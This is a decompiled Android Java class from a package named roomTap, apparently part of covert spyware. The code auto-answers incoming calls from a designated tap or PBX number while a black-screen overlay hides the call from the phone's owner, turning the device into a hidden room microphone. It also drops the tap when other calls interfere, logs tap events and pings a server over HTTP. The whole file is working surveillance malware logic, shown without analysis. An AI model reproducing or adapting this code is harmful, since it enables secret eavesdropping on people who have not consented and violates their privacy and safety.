package com.network.android.roomTap;

import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.telephony.TelephonyManager;
import com.network.android.a.c;
import com.network.android.c.a.b;

/* access modifiers changed from: package-private */
public final class a implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Intent f114a;
    final /* synthetic */ Context b;
    final /* synthetic */ AutoAnswerReceiver c;

    a(AutoAnswerReceiver autoAnswerReceiver, Intent intent, Context context) {
        this.c = autoAnswerReceiver;
        this.f114a = intent;
        this.b = context;
    }

    public final void run() {
        try {
            String unused = AutoAnswerReceiver.l = this.f114a.getStringExtra("state");
            String unused2 = AutoAnswerReceiver.o = this.f114a.getStringExtra("incoming_number");
            com.network.android.c.a.a.a("berez isOffHook = false");
            AutoAnswerReceiver.c = false;
            com.network.android.c.a.a.a("AutoAnswerReceiver phone_state: " + AutoAnswerReceiver.l + " Incoming number: " + AutoAnswerReceiver.o);
            if (AutoAnswerReceiver.l.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                if (!AutoAnswerReceiver.b(AutoAnswerReceiver.o)) {
                    com.network.android.c.a.a.a("AutoAnswerReceiver onRecieve - this is not the room tap number");
                    if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(AutoAnswerReceiver.h) && AutoAnswerReceiver.a()) {
                        com.network.android.c.a.a.a("AutoAnswerReceiver onRecieve isOffHook = true");
                        AutoAnswerReceiver.c = true;
                        com.network.android.c.a.a.a("AutoAnswerReceiver onRecieve Interfering tap with waiting call. killing tap. not answering. lastCall: " + AutoAnswerReceiver.h);
                        b.a(1, 63, "ROOM_TAP_ENDED_INCOMING_CALL");
                        AutoAnswerReceiver.b(this.b);
                        AutoAnswerReceiver.d = true;
                        AutoAnswerReceiver.e(this.b);
                    } else if (c.b() && !AutoAnswerReceiver.a()) {
                        b.a(1, (short) 63);
                        com.network.android.c.a.a.a("Auto answer tap window ended be incoming call" + AutoAnswerReceiver.h);
                        AutoAnswerReceiver.b(this.b);
                        AutoAnswerReceiver.d = true;
                        AutoAnswerReceiver.e(this.b);
                        c.a();
                        c.a(this.b, "httpPing");
                    }
                } else if (!AutoAnswerReceiver.a()) {
                    if (c.b()) {
                        com.network.android.c.a.a.a("AutoAnswerReceiver onRecieve TelephonyManager.EXTRA_STATE_RINGING");
                        this.c.a(this.b);
                        if (!BlackScreen.f111a) {
                            com.network.android.c.a.a.a("AutoAnswerReceiver onRecieve BlackSCreen screen is not shown and got call!!! disconnecting");
                            b.a(1, 56, "ROOM_TAP_NOT_ALLOWED_HIDE_ROOM_TAP_FAILED");
                            AutoAnswerReceiver.b(this.b);
                            return;
                        }
                        String unused3 = AutoAnswerReceiver.p = AutoAnswerReceiver.o;
                        com.network.b.b.p();
                        com.network.b.b.u();
                    } else if (AutoAnswerReceiver.a(AutoAnswerReceiver.o)) {
                        com.network.android.c.a.a.a("AutoAnswerReceiver onRecieve disconnecting. we are getting call from pbx and we are not on tap window");
                        AutoAnswerReceiver.b(this.b);
                        new Handler().postDelayed(new b(this), 3000);
                        return;
                    }
                } else if (AutoAnswerReceiver.a(AutoAnswerReceiver.o)) {
                    com.network.android.c.a.a.a("AutoAnswerReceiver onRecieve - got another call from tap pbx. doing nothing!");
                }
            } else if (AutoAnswerReceiver.l.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                com.network.android.c.a.a.a("berez isOffHook = true");
                AutoAnswerReceiver.c = true;
            } else if (AutoAnswerReceiver.l.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                com.network.android.c.a.a.a("EXTRA_STATE_IDLE");
                if (AutoAnswerReceiver.a()) {
                    com.network.android.c.a.a.a("TelephonyManager.EXTRA_STATE_IDLE room tap ended");
                    b.a(1, (short) 23);
                    try {
                        AutoAnswerReceiver.d = true;
                        AutoAnswerReceiver.f(this.b);
                        AutoAnswerReceiver.n.postDelayed(new c(this, this.b), 1000);
                    } catch (Exception e) {
                        com.network.android.c.a.a.a("berez mHandler.postDelayed - " + e.getMessage(), e);
                    }
                } else {
                    com.network.android.c.a.a.a("autoAnswerReciever changing room tap false");
                    AutoAnswerReceiver.a(false);
                }
            }
            String unused4 = AutoAnswerReceiver.h = AutoAnswerReceiver.l;
            if (AutoAnswerReceiver.o != null) {
                String unused5 = AutoAnswerReceiver.i = AutoAnswerReceiver.o;
            }
        } catch (Exception e2) {
            com.network.android.c.a.a.a("berez Exception- " + e2.getMessage(), e2);
        }
    }
}
